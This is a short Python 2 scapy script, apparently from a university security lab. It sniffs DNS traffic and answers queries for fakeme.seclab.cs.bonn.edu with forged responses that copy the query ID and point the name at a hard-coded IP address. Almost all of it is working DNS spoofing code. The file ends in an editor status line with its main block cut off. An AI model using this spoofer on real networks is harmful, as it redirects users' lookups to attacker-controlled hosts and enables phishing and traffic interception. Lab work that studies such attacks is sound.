import signal
import sys
from scapy.all import *
#os.system("command")

def handle_sigint(signum, frame):
    print '\nExiting...'
    sys.exit(0)


def print_packet(packet):
    #packet.show()
    #print packet[IP].src
    #print packet[DNS].qd.qname
    """
    if the domain name in the packet is fakeme.seclab.cs.bonn.edu
    then generate a spoofed packet whith spoofed values
    like same DNS ID and rdata as our own ip in answer part of the query
    """
    if packet[DNS].qd.qname == 'fakeme.seclab.cs.bonn.edu.':
        print 'yes'
        print IP
        spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/\
        UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
        DNS(id=packet[DNS].id, qr=1L, aa=0L, tc=0L, rd=1L, ra=0L, z=0L, rcode='ok', qd=packet[DNS].qd, qdcount=1, ancount=1, nscount=0, arcount=0,\
        an=(DNSRR(rrname=packet[DNS].qd.qname, rclass='IN', type='A', ttl=86400, rdata='94.221.161.165')),\
        ns=None, ar=None)
        send(spoofed_packet)

def start_sniffing():
    signal.signal(signal.SIGINT, handle_sigint)
    print 'Starting to sniff. Hit Ctrl+C to exit...'
    sniff(filter='udp and port 53', prn=print_packet)


def main(argv=None):
    if argv is None:
        argv = sys.argv
    start_sniffing()


if __name__ == '__main__':
"sniff1.py" 43L, 1313C   